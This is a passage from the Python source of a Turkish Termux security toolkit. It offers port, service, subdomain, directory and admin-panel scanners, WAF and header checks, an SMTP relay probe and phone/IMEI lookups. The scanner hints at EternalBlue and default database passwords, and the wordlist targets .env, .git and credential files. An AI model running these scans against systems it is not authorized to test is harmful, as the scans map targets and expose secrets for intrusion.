# -*- coding: utf-8 -*-
"""
============================================================
 MarkOs X Termux - v2.0 (Tam Donanımlı)
 30 Gerçek & Çalışır Siber Güvenlik Aracı
 Yapımcı: @markospm19_
 Not: Tüm araçlar yalnızca yetkili güvenlik testleri içindir.
============================================================
"""
import os
import sys
import re
import ssl
import json
import math
import time
import queue
import shutil
import socket
import struct
import hashlib
import secrets
import string
import threading
import subprocess
import datetime
from colorama import Fore, init

init(autoreset=True)

try:
    import requests
    try:
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass
except ImportError:
    requests = None

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    SCAPY_VAR = True
except Exception:
    SCAPY_VAR = False

YESIL = Fore.GREEN
SARI = Fore.YELLOW
MAVI = Fore.BLUE
KIRMIZI = Fore.RED

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")

LOG_DOSYA = os.path.expanduser("~/markos_log.jsonl")

# ============================================================
# ORTAK YARDIMCI FONKSİYONLAR
# ============================================================

def bekle():
    input(f"\n{YESIL}Devam etmek için Enter'a basın...")

def banner_yap():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{YESIL} ========= MarkOs X Termux =================")
    print(f"{YESIL}")
    print(f"{YESIL}     ___               ___")
    print(f"{YESIL}    /  /\\             / /\\")
    print(f"{YESIL}   /  /   \\         / /    \\")
    print(f"{YESIL}  /  /     \\_______/ /         \\")
    print(f"{YESIL} /  /                           \\ \\")
    print(f"{YESIL}/ /                              \\ \\")
    print(f"{YESIL}  MARKOS işletim sistemi 2026")
    print(f"{KIRMIZI} =================================================")
    print(f"{YESIL} [*] Yapimcisi : @markospm19_ ")
    print(f"{YESIL} [+] 30 Özel Yazilimli Araç (Tam Sürüm)")
    print(f"{KIRMIZI} =================================================\n")

def log_kaydet(arac, hedef, detay):
    try:
        os.makedirs(os.path.dirname(LOG_DOSYA), exist_ok=True)
        kayit = {"zaman": time.strftime("%Y-%m-%d %H:%M:%S"),
                 "arac": arac, "hedef": hedef, "detay": detay}
        with open(LOG_DOSYA, "a", encoding="utf-8") as f:
            f.write(json.dumps(kayit, ensure_ascii=False) + "\n")
    except Exception:
        pass

def http_get(url, timeout=10, headers=None):
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    return requests.get(url, headers=h, timeout=timeout, verify=False)

def dns_google(ad, tip):
    try:
        r = requests.get(f"https://dns.google/resolve?name={ad}&type={tip}", timeout=10)
        if r.status_code == 200:
            return [a.get("data") for a in r.json().get("Answer", [])]
    except Exception:
        pass
    return []

def port_tara(ip, portlar, timeout=0.5):
    sonuc = {}
    def _t(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip, p)) == 0:
                sonuc[p] = True
            s.close()
        except Exception:
            pass
    ths = [threading.Thread(target=_t, args=(p,)) for p in portlar]
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    return sonuc

def banner_al(ip, port, timeout=4):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(b"\r\n")
        b = s.recv(1024).decode(errors="replace").strip()
        s.close()
        return b
    except Exception:
        return None

def yerel_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

def public_ip():
    try:
        return requests.get("http://ip-api.com/json/?fields=query", timeout=8).json().get("query")
    except Exception:
        return None

def ip_api(ip):
    try:
        r = requests.get(
            "http://ip-api.com/json/" + ip +
            "?fields=status,country,regionName,city,isp,org,as,lat,lon,timezone,reverse,query",
            timeout=10)
        if r.status_code == 200 and r.json().get("status") == "success":
            return r.json()
    except Exception:
        pass
    return None

def luhn_dogrula(sayi):
    sayi = sayi.replace(" ", "").replace("-", "")
    if not sayi.isdigit():
        return False
    toplam = 0
    ters = [int(c) for c in sayi[::-1]]
    for i, d in enumerate(ters):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        toplam += d
    return toplam % 10 == 0

def tc_kontrol(tc):
    if not re.fullmatch(r"\d{11}", tc) or tc[0] == "0":
        return False
    h = [int(d) for d in tc]
    if (sum(h[0:10:2]) * 7 - sum(h[1:9:2])) % 10 != h[9]:
        return False
    return sum(h[:10]) % 10 == h[10]

def ssl_bilgi(host, port=443):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(6)
            s.connect((host, port))
            cert = s.getpeercert()
            return {"versiyon": s.version(), "cipher": s.cipher()[0],
                    "sertifika": cert}
    except Exception:
        return None

def insan_zamani(saniye):
    birimler = [("yıl", 31536000), ("gün", 86400), ("saat", 3600),
                ("dakika", 60), ("saniye", 1)]
    for ad, deger in birimler:
        if saniye >= deger:
            return f"{saniye / deger:.1f} {ad}"
    return "anında"

SERVIS_HARITASI = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
    143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
    6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
    9200: "Elasticsearch", 11211: "Memcached", 27017: "MongoDB",
}

ZAFIYET_IPUCU = {
    21: "FTP banner'ını incele (vsftpd 2.3.4 = CVE-2011-2523 backdoor riski)",
    23: "Telnet açık - şifresiz protokol, brute-force hedefi",
    139: "NetBIOS açık - SMB enum riski",
    445: "SMB açık - MS17-010 (EternalBlue) test et",
    3306: "MySQL açık - root boş şifre / zayıf kimlik testi yap",
    3389: "RDP açık - BlueKeep (CVE-2019-0708) kontrol et",
    5432: "PostgreSQL açık - varsayılan postgres/postgres dene",
    5900: "VNC açık - kimlik doğrulamasız erişim testi yap",
    6379: "Redis açık - yetkisiz erişim (unauth) testi yap",
    9200: "Elasticsearch açık - yetkisiz erişim riski",
    11211: "Memcached açık - DDoS amplifikasyon riski",
    27017: "MongoDB açık - yetkisiz erişim riski",
}

# ============================================================
# 1. AĞ ZAFİYET TARAMASI (Port + Servis + Banner + İpucu)
# ============================================================
def ag_zafiyet_tarama():
    banner_yap()
    print(f"\n{YESIL}[+] Savunma Analizi: Çoklu Port ve Servis Tarayıcı")
    hedef = input(f"{SARI}Analiz Edilecek IP/Domain (Örn: localhost): ").strip()
    try:
        hedef_ip = socket.gethostbyname(hedef)
    except socket.gaierror:
        print(f"{KIRMIZI}[-] Hata: Geçersiz Hedef Adresi!")
        bekle()
        return
    print(f"{YESIL}[*] {hedef_ip} taranıyor...")
    portlar = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
               445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900,
               5985, 6379, 8080, 8443, 8888, 9200, 11211, 27017]
    acik = port_tara(hedef_ip, portlar, timeout=0.6)
    print(f"\n{MAVI}{'PORT':<8}{'SERVİS':<16}{'DURUM':<8}BAŞLIK")
    print(f"{MAVI}{'-'*70}")
    sonuc = []
    for p in sorted(acik):
        servis = SERVIS_HARITASI.get(p, "Bilinmiyor")
        baslik = banner_al(hedef_ip, p)
        print(f"{YESIL}{p:<8}{servis:<16}{'AÇIK':<8}{baslik or '-'}")
        sonuc.append({"port": p, "servis": servis, "banner": baslik,
                      "ipucu": ZAFIYET_IPUCU.get(p, "")})
    if not acik:
        print(f"{KIRMIZI}[-] Açık port bulunamadı (30 ortak port tarandı).")
    else:
        print(f"\n{SARI}[!] Güvenlik İpuçları:")
        for s in sonuc:
            if s["ipucu"]:
                print(f"{SARI}  Port {s['port']}: {s['ipucu']}")
    log_kaydet("Ağ Zafiyet Taraması", hedef, sonuc)
    bekle()

# ============================================================
# 2. WAF ALGILAMA SİSTEMİ
# ============================================================
def waf_algilama():
    banner_yap()
    print(f"\n{YESIL}[+] Keşif Sistemi: Web İstek ve WAF Algılama")
    site = input(f"{SARI}Hedef Site Adresi (Örn: google.com): ").strip()
    if not site.startswith(("http://", "https://")):
        site = "https://" + site
    try:
        r = http_get(site)
    except Exception:
        print(f"{KIRMIZI}[-] Hata: Sunucuya ulaşılamadı.")
        bekle()
        return
    h = {k.lower(): v for k, v in r.headers.items()}
    print(f"\n{YESIL}[*] {site} analiz edildi (HTTP {r.status_code})")
    print(f"{MAVI}{'-'*50}")
    waf = None
    if "cf-ray" in h or "cf-cache-status" in h:
        waf = "Cloudflare"
    elif "x-sucuri-id" in h or "x-sucuri-cache" in h:
        waf = "Sucuri"
    elif "x-amzn-requestid" in h or "x-amz-cf-id" in h:
        waf = "AWS WAF / CloudFront"
    elif "incap_ses" in str(r.headers).lower() or "x-cdn" in h:
        waf = "Imperva / Incapsula"
    elif "akamai" in str(r.headers).lower():
        waf = "Akamai"
    elif "bigipserver" in str(r.headers).lower():
        waf = "F5 BIG-IP"
    elif "server" in h and "mod_security" in h.get("server", "").lower():
        waf = "ModSecurity"
    print(f"{YESIL}[✓] Tespit: {waf or 'Bilinmeyen / WAF yok'}")
    if "server" in h:
        print(f"{SARI}[*] Sunucu Yazılımı: {h['server']}")
    if "x-powered-by" in h:
        print(f"{SARI}[*] X-Powered-By (bilgi sızıntısı): {h['x-powered-by']}")
    if "set-cookie" in h and "httponly" not in h["set-cookie"].lower():
        print(f"{KIRMIZI}[-] Set-Cookie HttpOnly değil!")
    # HTTP metot testi
    try:
        m = requests.options(site, headers={"User-Agent": UA}, timeout=8, verify=False)
        print(f"{YESIL}[*] OPTIONS Allow: {m.headers.get('Allow', 'yok')}")
    except Exception:
        pass
    # TRACE testi (XST riski)
    try:
        t = requests.request("TRACE", site, headers={"User-Agent": UA}, timeout=8, verify=False)
        if t.status_code == 200 and "TRACE" in t.text:
            print(f"{KIRMIZI}[-] TRACE aktif - XST (Cross-Site Tracing) riski!")
    except Exception:
        pass
    log_kaydet("WAF Algılama", site, {"waf": waf, "sunucu": h.get("server", "")})
    bekle()

# ============================================================
# 3. IMEI AĞ VERİ ANALİZİ (Luhn + TAC)
# ============================================================
TAC_MARKALAR = {
    "490154": "Sony / Sony Ericsson", "353625": "Samsung",
    "351505": "Nokia", "359290": "Huawei", "868001": "Xiaomi",
    "355032": "LG", "355172": "Motorola", "359521": "HTC",
    "351750": "BlackBerry", "356938": "Oppo", "354431": "OnePlus",
    "357849": "Google", "352652": "ZTE", "356353": "HMD / Nokia",
    "359457": "Vivo", "867585": "Realme", "359192": "Alcatel",
    "351735": "Siemens", "354953": "Lenovo", "352390": "Asus",
}

def imei_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] Donanım Kontrolü: IMEI Veri Hattı Analizörü")
    imei = input(f"{SARI}Cihaz IMEI Numarası: ").strip()
    if not imei.isdigit() or len(imei) not in (15, 16, 17):
        print(f"{KIRMIZI}[-] Geçersiz IMEI formatı! (15, 16 veya 17 haneli olmalı)")
        bekle()
        return
    print(f"{YESIL}[*] {imei} doğrulanıyor (Luhn algoritması)...")
    time.sleep(0.8)
    if luhn_dogrula(imei):
        print(f"{YESIL}[✓] Kontrol Rakamı: GEÇERLİ (Luhn doğrulandı)")
    else:
        print(f"{KIRMIZI}[-] Kontrol Rakamı: GEÇERSİZ (hatalı veya üretilmiş IMEI)")
    tac = imei[:6]
    marka = TAC_MARKALAR.get(tac)
    print(f"{YESIL}[+] TAC (İlk 6 hane): {tac}")
    print(f"{YESIL}[+] Üretici Tahmini: {marka or 'Veritabanında yok (güncel TAC olabilir)'}")
    if len(imei) >= 15:
        print(f"{YESIL}[+] Cihaz Seri No: {imei[6:14]}")
        print(f"{YESIL}[+] Kontrol Rakamı: {imei[14]}")
    if len(imei) == 17:
        print(f"{SARI}[!] 17 haneli - MEID + SVN (yazılım sürümü) formatı")
    log_kaydet("IMEI Analizi", imei, {"gecerli": luhn_dogrula(imei),
                                      "marka": marka})
    bekle()

# ============================================================
# 4. TELEFON SORGU OSINT
# ============================================================
ULKE_KODLARI = {
    "+1": "ABD/Kanada", "+44": "İngiltere", "+49": "Almanya",
    "+33": "Fransa", "+34": "İspanya", "+39": "İtalya",
    "+31": "Hollanda", "+48": "Polonya", "+7": "Rusya",
    "+86": "Çin", "+81": "Japonya", "+82": "Güney Kore",
    "+91": "Hindistan", "+55": "Brezilya", "+52": "Meksika",
    "+90": "Türkiye", "+30": "Yunanistan", "+40": "Romanya",
    "+359": "Bulgaristan", "+381": "Sırbistan", "+971": "BAE",
    "+966": "Suudi Arabistan", "+962": "Ürdün", "+20": "Mısır",
}

TR_OPERATOR = {
    "501": "PttCell (Sanal Operatör)", "505": "PttCell / Türk Telekom",
    "506": "Türk Telekom (Sanal)", "507": "Vodafone (Sanal)",
    "530": "Turkcell", "531": "Turkcell", "532": "Turkcell",
    "533": "Turkcell", "534": "Turkcell", "535": "Turkcell",
    "536": "Turkcell", "537": "Turkcell", "538": "Turkcell",
    "539": "Turkcell", "540": "Vodafone", "541": "Vodafone",
    "542": "Vodafone", "543": "Vodafone", "544": "Vodafone",
    "545": "Vodafone", "546": "Vodafone", "547": "Vodafone",
    "548": "Vodafone", "549": "Vodafone", "550": "Türk Telekom",
    "551": "Türk Telekom", "552": "Türk Telekom", "553": "Türk Telekom",
    "554": "Türk Telekom", "555": "Türk Telekom", "556": "Türk Telekom",
    "557": "Türk Telekom", "558": "Türk Telekom", "559": "Türk Telekom",
}

def telefon_sorgu_osint():
    banner_yap()
    print(f"\n{YESIL}[+] Siber İstihbarat: OSINT Telefon Format Analizi")
    numara = input(f"{SARI}Sorgulanacak Numarayı Girin (Örn: +90532xxxxxxx): ").strip()
    regex = re.compile(r'^\+?(\d{1,3})?[-.\s]?(?:\d{3})[-.\s]?\d{3}[-.\s]?\d{4}$')
    if not regex.match(numara):
        print(f"\n{KIRMIZI}[-] Format Analizi: GEÇERSİZ NUMARA FORMATI")
        bekle()
        return
    print(f"\n{YESIL}[✓] Format Analizi: GEÇERLİ ULUSLARARASI NUMARA")
    temiz = re.sub(r"[^\d+]", "", numara)
    if temiz.startswith("+90") or temiz.startswith("0090") or \
       (not temiz.startswith("+") and temiz.startswith("5") and len(temiz) == 10):
        print(f"{YESIL}[+] Ülke: Türkiye (TR)")
        yerel = temiz[-10:]
        if len(yerel) == 10 and yerel.startswith("5"):
            op = TR_OPERATOR.get(yerel[:3])
            print(f"{YESIL}[+] Operatör (ön ek bazlı): {op or 'Bilinmiyor (numara taşınabilirliği olabilir)'}")
            print(f"{SARI}[!] Not: Numara taşınabilirliği nedeniyle operatör kesin olmayabilir.")
        elif len(yerel) == 10:
            alan = yerel[:3]
            print(f"{YESIL}[+] Sabit Hat (Alan Kodu {alan}) - şehir doğrulaması için kentsel rehber kullan")
    else:
        cc = None
        for kod, ad in ULKE_KODLARI.items():
            if temiz.startswith(kod):
                cc = f"{kod} -> {ad}"
                break
        print(f"{YESIL}[+] Ülke: {cc or 'Uluslararası format (ülke kodu tanınamadı)'}")
    log_kaydet("Telefon OSINT", numara, {"durum": "geçerli format"})
    bekle()

# ============================================================
# 5. SUBDOMAIN KEŞİF ARACI
# ============================================================
SUBDOMAIN_LISTE = [
    "www", "mail", "webmail", "smtp", "pop", "imap", "ftp", "sftp",
    "ns1", "ns2", "ns3", "dns", "mx", "mx1", "mx2", "vpn", "remote",
    "secure", "portal", "my", "owa", "exchange", "autodiscover",
    "cpanel", "whm", "plesk", "web", "app", "api", "api2", "dev",
    "test", "staging", "beta", "demo", "shop", "store", "m", "mobile",
    "blog", "news", "forum", "support", "help", "status", "git",
    "gitlab", "jenkins", "ci", "jira", "wiki", "docs", "intranet",
    "extranet", "ldap", "radius", "proxy", "cache", "cdn", "static",
    "assets", "media", "img", "video", "download", "upload", "files",
    "backup", "db", "mysql", "sql", "oracle", "data", "analytics",
    "stats", "monitor", "nagios", "zabbix", "grafana", "kibana",
    "elastic", "redis", "mongo", "mongodb", "docker", "k8s",
    "registry", "repo", "svn", "redmine", "phpmyadmin", "adminer",
    "pma", "roundcube", "horde", "zimbra", "cal", "sso", "auth",
    "login", "account", "billing", "pay", "payment", "crm", "erp",
    "hr", "partner", "reseller", "prod", "production", "live", "old",
    "new", "temp", "tmp", "alpha", "beta2",
]

def subdomain_kesif():
    banner_yap()
    print(f"\n{YESIL}[+] Keşif: Subdomain Bulucu (Brute + CRT Sertifika Günlüğü)")
    domain = input(f"{SARI}Hedef Alan Adı (Örn: example.com): ").strip().lower()
    domain = re.sub(r"^www\.", "", domain)
    if not re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", domain):
        print(f"{KIRMIZI}[-] Geçersiz alan adı!")
        bekle()
        return
    bulunan = set()
    kilit = threading.Lock()
    print(f"{YESIL}[*] {len(SUBDOMAIN_LISTE)} alt alan adı deneniyor...")
    def dene(ad):
        tam = f"{ad}.{domain}"
        try:
            ip = socket.gethostbyname(tam)
            with kilit:
                bulunan.add((tam, ip))
        except socket.gaierror:
            pass
    ths = [threading.Thread(target=dene, args=(a,)) for a in SUBDOMAIN_LISTE]
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    print(f"\n{YESIL}[*] crt.sh sertifika günlüğü taranıyor...")
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json",
                         headers={"User-Agent": UA}, timeout=30)
        if r.status_code == 200:
            for kayit in r.json():
                for ad in kayit.get("name_value", "").split("\n"):
                    ad = ad.strip().lstrip("*.")
                    if ad.endswith(domain):
                        try:
                            ip = socket.gethostbyname(ad)
                            bulunan.add((ad, ip))
                        except socket.gaierror:
                            bulunan.add((ad, "çözülemedi"))
    except Exception:
        print(f"{SARI}[!] crt.sh sorgusu başarısız oldu (ağ veya zaman aşımı).")
    print(f"\n{MAVI}{'SUBdomain':<45}IP")
    print(f"{MAVI}{'-'*70}")
    for ad, ip in sorted(bulunan):
        print(f"{YESIL}{ad:<45}{ip}")
    print(f"\n{YESIL}[+] Toplam bulunan: {len(bulunan)}")
    if bulunan:
        dizin = os.path.expanduser("~/markos_subdomains")
        os.makedirs(dizin, exist_ok=True)
        dosya = f"{dizin}/{domain}.txt"
        with open(dosya, "w", encoding="utf-8") as f:
            for ad, ip in sorted(bulunan):
                f.write(f"{ad}\t{ip}\n")
        print(f"{YESIL}[+] Kaydedildi: {dosya}")
    log_kaydet("Subdomain Keşfi", domain, {"adet": len(bulunan)})
    bekle()

# ============================================================
# 6. DNS KAYIT ANALİZİ
# ============================================================
def dns_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] Analiz: DNS Kayıt Sorgulayıcı (Google DoH)")
    domain = input(f"{SARI}Hedef Alan Adı: ").strip().lower()
    tipler = [("A", "IPv4"), ("AAAA", "IPv6"), ("MX", "Mail Exchange"),
              ("NS", "Name Server"), ("TXT", "TXT / SPF / DKIM"),
              ("CNAME", "CNAME"), ("SOA", "SOA Başlangıç")]
    print(f"\n{MAVI}{'TİP':<8}{'KAYIT'}")
    print(f"{MAVI}{'-'*70}")
    toplam = 0
    for tip, ad in tipler:
        kayitlar = dns_google(domain, tip)
        if kayitlar:
            toplam += len(kayitlar)
            for k in kayitlar:
                print(f"{YESIL}{tip:<8}{k[:110]}")
    if toplam == 0:
        print(f"{KIRMIZI}[-] Kayıt bulunamadı - alan adı aktif olmayabilir.")
    print(f"\n{SARI}[*] Öneri: SPF/DKIM/DMARC kontrolü için TXT kayıtlarını inceleyin.")
    log_kaydet("DNS Analizi", domain, {"kayit_sayisi": toplam})
    bekle()

# ============================================================
# 7. HTTP GÜVENLİK BAŞLIK TARAMASI
# ============================================================
GUVENLIK_BASLIKLAR = [
    ("Strict-Transport-Security", "HSTS", 20),
    ("Content-Security-Policy", "CSP", 15),
    ("X-Frame-Options", "Clickjacking koruması", 10),
    ("X-Content-Type-Options", "MIME sniffing koruması", 10),
    ("X-XSS-Protection", "XSS filtresi", 5),
    ("Referrer-Policy", "Referrer politikası", 5),
    ("Permissions-Policy", "Permissions policy", 5),
    ("Cross-Origin-Opener-Policy", "COOP", 3),
]

def http_guvenlik():
    banner_yap()
    print(f"\n{YESIL}[+] Tarama: HTTP Güvenlik Başlık Analizi")
    site = input(f"{SARI}Hedef Site (Örn: example.com): ").strip()
    if not site.startswith(("http://", "https://")):
        site = "https://" + site
    try:
        r = http_get(site)
    except Exception:
        print(f"{KIRMIZI}[-] Bağlantı kurulamadı!")
        bekle()
        return
    h = {k.lower(): v for k, v in r.headers.items()}
    print(f"\n{YESIL}[*] {site} -> HTTP {r.status_code}")
    puan = 0
    print(f"{MAVI}{'BAŞLIK':<38}{'DURUM':<6}PUAN")
    print(f"{MAVI}{'-'*70}")
    for baslik, aciklama, p in GUVENLIK_BASLIKLAR:
        var = baslik.lower() in h
        if var:
            puan += p
            print(f"{YESIL}{baslik:<38}✓    +{p}")
        else:
            print(f"{KIRMIZI}{baslik:<38}✗     0  ({aciklama})")
    # Çerez kontrolleri
    for c in r.headers.get_list if hasattr(r.headers, "get_list") else []:
        pass
    cikti = r.headers.get("set-cookie") or ""
    if cikti:
        eksik = []
        if "httponly" not in cikti.lower():
            eksik.append("HttpOnly")
        if "secure" not in cikti.lower():
            eksik.append("Secure")
        if "samesite" not in cikti.lower():
            eksik.append("SameSite")
        if eksik:
            print(f"{KIRMIZI}[-] Çerez eksikleri: {', '.join(eksik)}")
            puan -= 3 * len(eksik)
    # HTTP -> HTTPS yönlendirme
    try:
        http_r = http_get(site.replace("https://", "http://"))
        if http_r.status_code in (301, 302, 308) and "https" in http_r.headers.get("location", ""):
            print(f"{YESIL}[✓] HTTP -> HTTPS yönlendirmesi mevcut")
        else:
            print(f"{KIRMIZI}[-] HTTP -> HTTPS yönlendirmesi YOK (MITM riski)")
    except Exception:
        print(f"{SARI}[!] HTTP yönlendirme testi yapılamadı")
    # TLS sürümü
    host = site.replace("https://", "").split("/")[0]
    bilgi = ssl_bilgi(host)
    if bilgi:
        print(f"{YESIL}[*] TLS: {bilgi['versiyon']} / Cipher: {bilgi['cipher']}")
        if bilgi["versiyon"] in ("SSLv3", "TLSv1", "TLSv1.1"):
            print(f"{KIRMIZI}[-] Eski TLS sürümü tespit edildi!")
            puan -= 10
    print(f"\n{SARI}[!] Güvenlik Puanı: {max(puan, 0)}/100")
    if puan >= 60:
        print(f"{YESIL}[+] Yapılandırma iyi durumda.")
    elif puan >= 30:
        print(f"{SARI}[!] Orta seviye - kritik başlıklar eksik.")
    else:
        print(f"{KIRMIZI}[-] Zayıf yapılandırma - acil düzeltme önerilir.")
    log_kaydet("HTTP Güvenlik Taraması", site, {"puan": max(puan, 0),
                                                "status": r.status_code})
    bekle()

# ============================================================
# 8. DİZİN & YÖNETİCİ PANELİ TARAYICI
# ============================================================
DIR_KELIMELER = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "admin/login.php", "panel", "cpanel", "phpmyadmin", "pma",
    "adminer.php", "api", "api/v1", "swagger", "docs", "config",
    "config.php", ".git", ".git/config", ".git/HEAD", ".env",
    "backup", "backup.zip", "db", "database.sql", "dump.sql",
    "wp-content", "wp-includes", "uploads", "images", "css", "js",
    "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd",
    "server-status", "server-info", "test", "phpinfo.php", "info.php",
    "shell.php", "upload", "download", "files", "filemanager", "editor",
    "console", "debug", "log", "logs", "error", "old", "new", "tmp",
    "temp", "data", "dev", "prod", "staging", "private", "secret",
    "keys", "ssl", "cert", "web.config", "crossdomain.xml", ".DS_Store",
    "user", "users", "register", "signup", "forgot", "reset", "verify",
    "health", "healthz", "status.php", "version", "changelog", "readme",
]

def dizin_tara():
    banner_yap()
    print(f"\n{YESIL}[+] Tarama: Dizin & Yönetici Paneli Bulucu")
    hedef = input(f"{SARI}Hedef URL (Örn: https://site.com): ").strip()
    if not hedef.startswith(("http://", "https://")):
        hedef = "https://" + hedef
    hedef = hedef.rstrip("/")
    print(f"{YESIL}[*] {len(DIR_KELIMELER)} yol taranıyor (15 iş parçacığı)...")
    sonuclar = []
    kilit = threading.Lock()
    def deneme(kelime):
        url = f"{hedef}/{kelime}"
        try:
            r = requests.get(url, headers={"User-Agent": UA}, timeout=8,
                             allow_redirects=False, verify=False)
            if r.status_code in (200, 201, 204, 301, 302, 307, 308, 401, 403):
                with kilit:
                    sonuclar.append((r.status_code, len(r.content), url))
        except Exception:
            pass
    isler = queue.Queue()
    for k in DIR_KELIMELER:
        isler.put(k)
    def isci():
        while True:
            try:
                k = isler.get_nowait()
            except queue.Empty:
                return
            deneme(k)
            isler.task_done()
    ths = [threading.Thread(target=isci) for _ in range(15)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    print(f"\n{MAVI}{'STATÜ':<7}{'BOYUT':<10}URL")
    print(f"{MAVI}{'-'*70}")
    dikkat = []
    for status, boyut, url in sorted(sonuclar):
        print(f"{YESIL}{status:<7}{boyut:<10}{url}")
        kucuk = url.lower()
        if any(x in kucuk for x in [".git", ".env", "backup", ".sql",
                                    "phpmyadmin", "adminer", "config",
                                    "phpinfo", "shell"]):
            dikkat.append(url)
    if dikkat:
        print(f"\n{KIRMIZI}[!] HASSAS DOSYA/DİZİN TESPİTİ:")
        for u in dikkat:
            print(f"{KIRMIZI}  -> {u}")
    if not sonuclar:
        print(f"{KIRMIZI}[-] Sonuç yok - tüm yollar 404/403 döndü.")
    log_kaydet("Dizin Taraması", hedef, {"bulunan": len(sonuclar),
                                         "hassas": dikkat})
    bekle()

# ============================================================
# 9. MAİL SUNUCU & MX ANALİZİ
# ============================================================
def mail_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] Analiz: Mail Sunucu & MX Güvenlik Testi")
    domain = input(f"{SARI}Hedef Alan Adı (Örn: example.com): ").strip().lower()
    mxler = dns_google(domain, "MX")
    if not mxler:
        print(f"{KIRMIZI}[-] MX kaydı bulunamadı - mail sunucusu yok.")
        bekle()
        return
    print(f"{YESIL}[*] MX Kayıtları: {', '.join(mxler)}")
    for mx in mxler:
        host = mx.split()[1].rstrip(".")
        print(f"\n{MAVI}{'='*60}")
        print(f"{MAVI}[*] MX: {host}")
        try:
            s = socket.create_connection((host, 25), timeout=8)
            s.settimeout(8)
            banner = s.recv(512).decode(errors="replace").strip()
            print(f"{YESIL}[*] SMTP Banner: {banner}")
            s.send(b"EHLO markos.test\r\n")
            ehlo = s.recv(2048).decode(errors="replace")
            print(f"{YESIL}[*] EHLO Yanıtı:\n{ehlo}")
            s.send(b"MAIL FROM:<test@markos.test>\r\n")
            m1 = s.recv(512).decode(errors="replace").split()[0]
            s.send(b"RCPT TO:<test@markos.test>\r\n")
            m2 = s.recv(512).decode(errors="replace").split()[0]
            s.send(b"QUIT\r\n")
            s.close()
            if m1 == "250" and m2 == "250":
                print(f"{KIRMIZI}[-] POTANSİYEL AÇIK RELAY TESPİTİ!")
            else:
                print(f"{YESIL}[✓] Açık relay yok (gönderim kısıtlı)")
        except Exception as e:
            print(f"{SARI}[!] Bağlantı hatası: {e}")
    txt = dns_google(domain, "TXT")
    spf = [t for t in txt if "v=spf1" in t]
    dmarc = dns_google(f"_dmarc.{domain}", "TXT")
    print(f"\n{MAVI}{'='*60}")
    print(f"{YESIL}[*] SPF: {spf[0][:110] if spf else 'YOK (sahtecilik riski)'}")
    print(f"{YESIL}[*] DMARC: {dmarc[0][:110] if dmarc else 'YOK (sahtecilik riski)'}")
    if not spf or not dmarc:
        print(f"{KIRMIZI}[-] SPF/DMARC eksik -> e-posta sahteciliği (spoofing) mümkün!")
    log_kaydet("Mail Analizi", domain, {"mx": len(mxler)})
    bekle()

# ============================================================
# 10. SSL/TLS SERTİFİKA VE PROTOKOL DENETİMİ
# ============================================================
def ssl_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] Analiz: SSL/TLS Sertifika ve Protokol Denetimi")
    hedef = input(f"{SARI}Hedef Domain:Port (Örn: google.com:443): ").strip()
    try:
        host, port = hedef.rsplit(":", 1)
        port = int(port)
    except Exception:
        print(f"{KIRMIZI}[-] Format hatalı! Örn: example.com:443")
        bekle(); return
    bilgi = ssl_bilgi(host, port)
    if not bilgi:
        print(f"{KIRMIZI}[-] SSL el sıkışması başarısız (servis TLS desteklemiyor olabilir).")
        bekle(); return
    cert = bilgi["sertifika"]
    print(f"\n{YESIL}[+] TLS Sürümü: {bilgi['versiyon']}")
    print(f"{YESIL}[+] Cipher: {bilgi['cipher']}")
    try:
        print(f"{YESIL}[+] Konu: {cert.get('subject')}")
        print(f"{YESIL}[+] Veren (CA): {cert.get('issuer')}")
        print(f"{YESIL}[+] Geçerlilik: {cert.get('notBefore')} -> {cert.get('notAfter')}")
        son = datetime.datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
        kalan = (son - datetime.datetime.utcnow()).days
        print(f"{SARI}[*] Sertifika süresi dolmasına: {kalan} gün")
        if kalan < 30:
            print(f"{KIRMIZI}[-] Sertifika 30 gün içinde doluyor!")
    except Exception:
        pass
    if hasattr(ssl, "TLSVersion"):
        for proto, v in (("TLSv1", ssl.TLSVersion.TLSv1),
                         ("TLSv1.1", ssl.TLSVersion.TLSv1_1)):
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = v
                ctx.maximum_version = v
                with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
                    s.settimeout(5); s.connect((host, port))
